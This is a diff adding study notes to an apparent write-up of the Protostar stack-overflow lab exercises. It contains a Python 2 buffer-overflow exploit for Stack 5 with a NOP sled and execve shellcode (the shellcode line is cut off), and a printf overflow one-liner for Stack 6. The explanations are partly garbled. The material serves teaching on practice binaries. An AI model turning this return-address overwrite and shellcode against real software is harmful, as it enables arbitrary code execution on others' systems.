@@ -139,3 +139,39 @@ int main(int argc, char **argv)
 ```
 
 for this type, find the crash point, then find the function add and add it after the crash point
+
+# Stack 5 (Concepts)
+
+```python
+import struct
+nop= 'A'*76
+sp=struct.pack("I",0xbffff7c0)
+#sh="\xde\xf7\xff\xbf"
+padding="\x90"*200# +"\xcc"*4
+shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69$
+payload=nop+sp+padding+shellcode
+print payload
+```
+
+First find the offset for the stack by segmentation fault and find the ebp by **x/2wx $ebp**, and the second one is the address of ebp as first line in gdb **push ebp** so it pushes the ebp in the stack the over the any value(garbage). because it moves to next  memory before pushing ebp.
+
+**Explaining Exploit:-**
+
+The offset is used to get to the eip and after marking the breakpoint to the last (main+27) and countinue forward(add \xcc [call to interrupt procedure ] so it overflow address after return address[which should be change to the int 3(\xcc) address ]) and overflow the return addresss with the address \xcc is. After the trap message appear , you can add shellcode instead of \xcc adding nop side(\x90) 
+
+# Stack 6
+
+```python
+printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\xbf" | ./stack6
+```
+
+first find the value of return and changed it with the hard coded value, 
+
+> Note : find the value same as value of return and try to over write that (Yet to research on that)
+> 
+
+`__builtin_return_address(0);` gives the return address for the function
+
+# Stack 7
+
+Same as previous, except the value to overwrite changed to 0xb0000000
